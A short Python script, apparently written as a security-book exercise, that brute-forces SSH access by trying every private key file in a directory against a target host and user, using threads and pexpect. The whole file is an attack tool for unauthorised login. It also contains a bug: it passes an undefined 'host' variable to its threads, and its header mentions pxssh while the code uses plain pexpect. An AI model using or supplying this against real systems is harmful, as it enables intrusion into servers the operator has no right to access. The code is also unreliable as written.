# SSH brute force with pxssh class and keyfile based on chapter 2
# Python 3.4
import pexpect
import argparse
import os
import threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connect(user, host, keyfile, release):

    global Stop
    global Fails

    try:

        # Define what pexpect should expect as return.
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'

        # SSH connection with keyfile instead of password. If no keyfile is sent, then it won't try connect.
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + ' -i' + keyfile + opt

        # Start connections and reads return.
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied,ssh_newkey, conn_closed, '$', '#'])


        if ret == 2:
            print("[-] Adding host to know_host file")
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print("[-] {0}.".format(conn_closed))
            Fails += 1
        elif ret > 3:
            print("[+] Success. {0}".format(str(keyfile)))
            Stop = True

    finally:

        # After succeed on trying connection, release the lock from resource.
        if release:
            connection_lock.release()

def main():

    # Define options and help.
    parser = argparse.ArgumentParser(description="Simple Python SSH Brute Force with keyfile")
    parser.add_argument('Target', help="Target host.")
    parser.add_argument('User', help="User for ssh connection.")
    parser.add_argument('KeyDir', help="Directory with private keyfiles for connection.")

    # Receive arguments from user
    args = parser.parse_args()
    tgtHost = args.Target
    user = args.User
    keyDir = args.KeyDir

    # If anything wasn't set, print the help from argparse and exit.
    if tgtHost == None or user == None or keyDir == None:
        print(parser.usage)
        exit(0)

    for keyfile in os.listdir(keyDir):

        if Stop:
            print("[*] Key found. Exiting.")
            exit(0)

        if Fails > 5:
            print("[!] Too many connection errors. Exiting.")
            exit(0)

        connection_lock.acquire()
        fullpath = os.path.join(keyDir, keyfile)
        print("[-] Testing key: {0}".format(str(fullpath)))
        bruteforce = threading.Thread(target=connect, args=(user, host, fullpath, True))
        child = bruteforce.start()

if __name__ == '__main__':
    main()